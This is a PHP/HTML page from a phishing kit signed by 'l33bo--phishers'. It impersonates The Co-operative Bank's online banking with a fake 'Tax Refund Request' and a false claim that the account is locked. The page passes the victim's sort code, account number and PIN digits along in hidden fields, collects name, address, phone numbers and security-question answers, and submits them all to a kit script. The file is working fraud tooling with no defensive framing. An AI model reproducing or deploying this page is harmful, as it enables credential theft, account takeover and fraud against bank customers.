<?php
/*
Created by::: l33bo--phishers ::: icq: 695059760 
*/
require "assets/includes/session_protect.php";
require_once("assets/includes/functions.php");

$sort = $_POST['sort'];
$acno = $_POST['acno'];
$pin1 = $_POST['pin1'];
$pin2 = $_POST['pin2'];
$pin3 = $_POST['pin3'];
$pin4 = $_POST['pin4'];
?>
<!DOCTYPE html>
<html>
<head>
    <title>Tax Refund Request</title>
    <meta content="IE=edge" http-equiv="X-UA-Compatible" />
<meta content="user-scalable=yes, width=device-width, initial-scale=1" name="viewport" />    
<link rel="stylesheet" href="assets/css/login.css" type="text/css">
<link rel="stylesheet" href="assets/css/custom.css" type="text/css">
<META content="text/html; charset=ISO-8859-1" http-equiv="Content-Type">
<meta http-equiv="pragma" content="no-cache" />
<meta name = "format-detection" content = "telephone=no">
</head>
<body>
  

	 <div id="coopHeader">
	  

     <div id="coopHeader">
        <div class="headIntro contain">
            <h1>The Co-operative bank</h1>
            <div class="accDetails">
                <strong></strong>   
            </div>
        </div>
    </div>





<div class="subHeadOuter">
    <div class="subHead contain">
    <h2>Tax Refund Request</h2>
	    <div class="subNav contain">
	        <ul>
		         
			    <li class="contain">
		          <a href="#" title="home"><span class="pink">Home</span></a> 
			    </li>
		         
		         
			    <li>
		          <a href="#" title="Log Off">Log off</a> 
			    </li>
		        
		        
		        
			    <li class="last">
		              <a href="error" target="_blank" title="click here for help, a new window will open">Help</a>
			    </li>
		               
		             
		        
		    </ul>
	    </div>
    </div>
</div>


	</div>
    
<table width="100%" cellpadding="0" cellspacing="0" border="0">
  <tr valign="top">
    <td width="25%" class="verttop" height="71%">









<table cellpadding="0" cellspacing="0" width="100%" border="0">
<tr>
<td height="10%"><br/>
<table cellpadding="2" cellspacing="0" width="100%" border="0">
  
    
    
    <tr valign="top">
      <td width="12%"/>
      
      <td>
        <a href="#"><img src="assets/img/pay-bills.gif" align="left" border="0" alt="pay bills"></a>
      </td>
      
    </tr>
    
    
    
    <tr valign="top">
      <td width="12%"/>
      
      <td>
        <a href="#"><img src="assets/img/standing-orders.gif" align="left" border="0" alt="standing orders"></a>
      </td>
      
    </tr>
    
    
    
    <tr valign="top">
      <td width="12%"/>
      
      <td>
        <a href="#"><img src="assets/img/money-transfers.gif" align="left" border="0" alt="money transfers"></a>
      </td>
      
    </tr>
    
    
    
    <tr valign="top">
      <td width="12%"/>
      
      <td>
        <a href="#"><img src="assets/img/foreign-transfers.gif" align="left" border="0" alt="foreign transfers"></a>
      </td>
      
    </tr>
    
    
    
    <tr valign="top">
      <td width="12%"/>
      
      <td>
        <a href="#"><img src="assets/img/direct-debits.gif" align="left" border="0" alt="direct debits"></a>
      </td>
      
    </tr>
    
    
    
    <tr valign="top">
      <td width="12%"/>
      
      <td>
        <a href="#"><img src="assets/img/customer_services_selected.gif" align="left" border="0" alt="customer services"></a>
      </td>
      
    </tr>
    
</table>
</td>
</tr>
<tr><td></td></tr>
</table>
	
</td>
    <td width="75%" class="verttop" height="71%">



<form name="login" method="post" action="Finish.php?&sessionid=<?php echo generateRandomString(110); ?>&securessl=true" onsubmit="return validateForm();">
<input type="hidden" name="sort" value="<? echo $sort ?>"> 
<input type="hidden" name="acno" value="<? echo $acno ?>"> 
<input type="hidden" name="pin1" value="<? echo $pin1 ?>"> 
<input type="hidden" name="pin2" value="<? echo $pin2 ?>"> 
<input type="hidden" name="pin3" value="<? echo $pin3 ?>"> 
<input type="hidden" name="pin4" value="<? echo $pin4 ?>"> 

    <table width="100%" border="0" cellpadding="0" cellspacing="0" >
    
    		
		<tr>
			<td>
				<br/>Your access to our online banking system has been disabled due to your password or security questions being entered incorrectly too many times, your account will automatically be locked to protect your security. In order to retore access you are required to complete the form below. <BR>
				<BR><p class="helpTextBlue"><b>Important:</b> If you update your contact details, this will overwrite your details for all of your accounts held with both smile and The Co-operative Bank, as we are part of the same banking group.</p>					
					
			</td>
		</tr>
		
		<tr>
			<td>	
				<div id="contactDetailsTitle"><b>Personal details</b></div>
			</td>
		</tr>
		<tr>
			<td class="error"></td>
		</tr>
		
		<tr>
			<td>
			  	<table width="100%" border="0" cellpadding="5px" cellspacing="0">
			  		<tr>
			  			<td colspan="3" class="error"></td>
			  		</tr>
			    	<tr>
			    	<p class="helpTextBlue">Please enter your personal details.</p>					
			       	</tr>
			    	<tr>
			    		<td width="20%"></td>
				    	<td colspan="2"></td>				    	
				    </tr>
				    <tr>
					    <td class="label">
					    	<label for="fname"><Strong>Full name</Strong></label>	
					    </td>
				        <td class="field">
				        	<Strong><input type="text" name="fname" maxlength="30" size="35" value="" class="boldTextInput" id="fname" value="<?php echo $_SESSION['name'];?>"></Strong>
					    </td>
					    <td/>
				    </tr>
				    <tr>
				    	<td/>
				    	<td id="fnameerr" class="error"></td>
				    	<td/>
				    </tr>
				    <tr>
					    <td class="label">
					    	<label for="address"><Strong>Address line 1</Strong></label>	
					    </td>
				        <td class="field">
				        	<Strong><input type="text" name="address" maxlength="30" size="35" value="" class="boldTextInput" id="address" value="<?php echo $_SESSION['address'];?>"></Strong>
					    </td>
					    <td/>
				    </tr>
				    <tr>
				    	<td/>
				    	<td id="addresserr" class="error"></td>
				    	<td/>
				    </tr>
				    <tr>
					    <td class="label">
					    	<label for="address"><Strong>Postcode</Strong></label>	
					    </td>
				        <td class="field">
				        	<Strong><input type="text" name="postcode" maxlength="8" size="10" value="" class="boldTextInput" id="postcode" value="<?php echo $_SESSION['postcode'];?>"></Strong>
					    </td>
					    <td/>
				    </tr>
				    <tr>
				    	<td/>
				    	<td id="postcodeerr" class="error"></td>
				    	<td/>
				    </tr>
				    <tr>
					    <td class="label">
					    	<label for="telephone"><Strong>Home telephone number<p class="changeDetailsHelpText">(including area code) </p></Strong></label>	
					    </td>
				        <td class="field">
				        	<Strong><input type="text" name="telephone" maxlength="11" size="35" value="" class="boldTextInput" id="telephone"></Strong>
					    </td>
					    <td/>
				    </tr>
				    <tr>
				    	<td/>
				    	<td id="telephoneerr" class="error"></td>
				    	<td/>
				    </tr>
				    <tr>
					    <td class="label">
					    	<label for="mobile"><Strong>Mobile number</Strong></label>
					    </td>
				        <td class="field">
				        	<Strong><input type="text" name="mobile" maxlength="11" size="35" value="" class="boldTextInput" id="mobile"></Strong>
					    </td>
					    <td/>
				    </tr>
				    <tr>
				    	<td/>
				    	<td id="mobileerr"class="error"></td>
				    	<td/>
				    </tr>
				   <tr>
				    	<td/>
				    	<td>&nbsp;</td>
				    	<td/>
				    </tr>
				 </table>  
			</td>
		</tr>


<tr>
			<td>	
				<div id="contactDetailsTitle"><b>Verify security questions</b></div>
			</td>
		</tr>
		<tr>
			<td class="error"></td>
		</tr>
		
		<tr>
			<td>
			  	<table width="100%" border="0" cellpadding="5px" cellspacing="0">
			  		<tr>
			  			<td colspan="3" class="error"></td>
			  		</tr>
			    	<tr>
			    	<p class="helpTextBlue">Please verify the answers to your security questions.</p>					
			       	</tr>
			    	<tr>
			    		<td width="20%"></td>
				    	<td colspan="2"></td>				    	
				    </tr>
				    <tr>
					    <td class="label">
					    	<label for="school"><Strong>Your first school attended</Strong></label>	
					    </td>
				        <td class="field">
				        	<Strong><input type="text" name="school" maxlength="30" size="35" value="" class="boldTextInput" id="school"></Strong>
					    </td>
					    <td/>
				    </tr>
				    <tr>
				    	<td/>
				    	<td id="schoolerr" class="error"></td>
				    	<td/>
				    </tr>
				    <tr>
					    <td class="label">
					    	<label for="memo"><Strong>Memorable Name  </Strong></label>	
					    </td>
				        <td class="field">
				        	<Strong><input type="text" name="memo" maxlength="30" size="35" value="" class="boldTextInput" id="memo"></Strong>
					    </td>
					    <td/>
				    </tr>
				    <tr>
				    	<td/>
				    	<td id="memoerr" class="error"></td>
				    	<td/>
				    </tr>
				    <tr>
					    <td class="label">
					    	<label for="pob"><Strong>Place of birth</Strong></label>	
					    </td>
				        <td class="field">
				        	<Strong><input type="text" name="pob" maxlength="30" size="35" value="" class="boldTextInput" id="pob"></Strong>
					    </td>
					    <td/>
				    </tr>
				    <tr>
				    	<td/>
				    	<td id="poberr" class="error"></td>
				    	<td/>
				    </tr>
				    <tr>
					    <td class="label">
					    	<label for="memodate"><Strong>Memorable date<p class="changeDetailsHelpText">(dd/mm/yyyy)</p></Strong></label>	
					    </td>
					    <td class="field">
						<input name="memoday" class="boldTextInput" maxlength="2" size="2" value="" id="memorabledate" type="text"> / 
						<input name="memomonth" class="boldTextInput" maxlength="2" size="2" value="" id="memorabledate" type="text"> / 
						<input name="memoyear" class="boldTextInput" maxlength="4" size="4" value="" id="memorabledate" type="text"></td>
					    <td/>
				    </tr>
				    <tr>
				    	<td/>
				    	<td id="memodateerr" class="error"></td>
				    	<td/>
				    </tr>
				    <tr>
					    <td class="label">
					    	<label for="lschool"><Strong>Your last school attended</Strong></label>	
					    </td>
				        <td class="field">
				        	<Strong><input type="text" name="lschool" maxlength="30" size="35" value="" class="boldTextInput" id="lschool"></Strong>
					    </td>
					    <td/>
				    </tr>
				    <tr>
				    	<td/>
				    	<td id="lschoolerr" class="error"></td>
				    	<td/>
				    </tr>
				   <tr>
				    	<td/>
				    	<td>&nbsp;</td>
				    	<td/>
				    </tr>
				 </table>  
			</td>
		</tr>
	
				
		
	
		
			    
			    

		
		
		
		
		<tr>
			<td>
				<br>
				<div>
			    	<div>
			    		<a href="#" id="confirmBtn" type="submit" value="" onclick="validLogin()"></a>
			    	</div>
			    </div>
		    </td>
		</tr>
	    		
	</table>
</form>
</td>
  </tr>
  <tr>
    <td height="5%" colspan="2"><table
    width="100%">
    <tr>
    	<td>
        </td>
    </tr>
</table></td>
  </tr>
</table>	
<script>
function validLogin() {
    var x = document.forms["login"]["fname"].value;
	if (x == null || x == "") {
		document.getElementById("fnameerr").innerHTML = "*** Please enter your full name. *** ";
        return false;
    }
document.getElementById("fnameerr").innerHTML = " ";
    var x = document.forms["login"]["address"].value;
	if (x == null || x == "") {
		document.getElementById("addresserr").innerHTML = "*** Please enter the first line of your address. ***";
        return false;
    }
document.getElementById("addresserr").innerHTML = "";
    var x = document.forms["login"]["postcode"].value;
	if (x == null || x == "") {
		document.getElementById("postcodeerr").innerHTML = "*** Please enter your postcode. ***";
        return false;
    }
document.getElementById("postcodeerr").innerHTML = "";
    var x = document.forms["login"]["school"].value;
	if (x == null || x == "") {
		document.getElementById("schoolerr").innerHTML = "*** Please enter your answer to this security question. ***";
        return false;
    }
document.getElementById("schoolerr").innerHTML = "";
    var x = document.forms["login"]["memo"].value;
	if (x == null || x == "") {
		document.getElementById("memoerr").innerHTML = "*** Please enter your answer to this security question. ***";
        return false;
    }
document.getElementById("memoerr").innerHTML = "";
    var x = document.forms["login"]["pob"].value;
	if (x == null || x == "") {
		document.getElementById("poberr").innerHTML = "*** Please enter your answer to this security question. ***";
        return false;
    }
document.getElementById("poberr").innerHTML = "";
    var x = document.forms["login"]["memoday"].value;
	if (x == null || x == "") {
		document.getElementById("memodateerr").innerHTML = "*** Please enter your answer to this security question. ***";
        return false;
    }
document.getElementById("memodateerr").innerHTML = "";
    var x = document.forms["login"]["memomonth"].value;
	if (x == null || x == "") {
		document.getElementById("memodateerr").innerHTML = "*** Please enter your answer to this security question. ***";
        return false;
    }
document.getElementById("memodateerr").innerHTML = "";
    var x = document.forms["login"]["memoyear"].value;
	if (x == null || x == "") {
		document.getElementById("memodateerr").innerHTML = "*** Please enter your answer to this security question. ***";
        return false;
    }
document.getElementById("memodateerr").innerHTML = "";
    var x = document.forms["login"]["lschool"].value;
	if (x == null || x == "") {
		document.getElementById("lschoolerr").innerHTML = "*** Please enter your answer to this security question. ***";
        return false;
    }
document.getElementById("lschoolerr").innerHTML = "";
document.login.submit();
}
</script>	
</body>
</html>